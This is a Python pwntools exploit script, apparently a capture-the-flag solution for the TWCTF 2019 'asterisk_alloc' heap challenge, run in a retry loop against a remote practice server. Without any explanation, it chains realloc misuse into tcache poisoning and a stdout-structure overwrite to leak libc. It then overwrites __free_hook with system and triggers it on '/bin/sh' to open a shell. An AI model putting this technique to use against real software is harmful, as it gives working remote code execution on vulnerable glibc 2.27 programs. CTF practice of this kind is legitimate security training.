from pwn import *
# context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])
context(log_level='debug')

def pwn():
    elf=ELF("./TWCTF_online_2019_asterisk_alloc")
    libc=ELF("./libc-2.27.so")

    def malloc(s,cc):
        io.sendlineafter(b"Your choice: ",b"1")
        io.sendlineafter(b"Size: ",str(s))
        io.sendafter(b"Data: ",cc)
        
    def calloc(s,cc):
        io.sendlineafter(b"Your choice: ",b"2")
        io.sendlineafter(b"Size: ",str(s))
        io.sendafter(b"Data: ",cc)
        
    def realloc(s,cc):
        io.sendlineafter(b"Your choice: ",b"3")
        io.sendlineafter(b"Size: ",str(s))
        io.sendafter(b"Data: ",cc)
        
    def delete(n):
        io.sendlineafter(b"Your ",b"4")
        io.sendlineafter(b"Which: ",n)

    # gdb.attach(io)
    # pause()

    realloc(0x100,b"aaa")
    realloc(0,b"")

    realloc(0x10,b"qqq")
    realloc(0,b"")

    realloc(0x100,b"aaa")
    realloc(0x60,b"qqq")
    realloc(0,b"")

    realloc(0x90,b"eee")

    for i in range(7):
        delete(b"r")
        
    realloc(0,b"")

    realloc(0x60,b"ttt")
    realloc(0x100,cyclic(0x68)+p64(0x91)+b"\x60\xc7")
    realloc(0,b"")

    realloc(0x90,b"eee")
    realloc(0,b"")

    payload=p64(0xfbad1887)+p64(0)*3+b"\x00"
    malloc(0x90,payload)
    # realloc(0,b"")

    leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x1c80-libc.sym[b"__malloc_hook"]
    print("leak_addr:  "+hex(leak_addr))
    malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
    free_hook=leak_addr+libc.sym[b"__free_hook"]
    sys_addr=leak_addr+libc.sym[b"system"]
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=leak_addr+one_gadget[1]

    realloc(0x100,b"aaa")
    realloc(0x60,b"qqq")
    realloc(0,b"")

    realloc(0x90,b"www")

    for i in range(2):
        delete(b"r")

    realloc(0,b"")
    # delete(b"r")
    realloc(0x60,b"qqq")
    realloc(0x100,cyclic(0x68)+p64(0x91)+p64(free_hook))
    realloc(0,b"")

    realloc(0x90,b"qqq")
    realloc(0,b"")

    realloc(0x90,p64(sys_addr))
    # realloc(0,b"")

    calloc(0x10,b"/bin/sh\x00")
    delete(b"c")
    # delete(b"m")

    io.interactive()
    
while True:
    try:
        io=remote("node4.buuoj.cn",26672)
        # io=process("./TWCTF_online_2019_asterisk_alloc")
        pwn()
    
    except:
        io.close()
        continue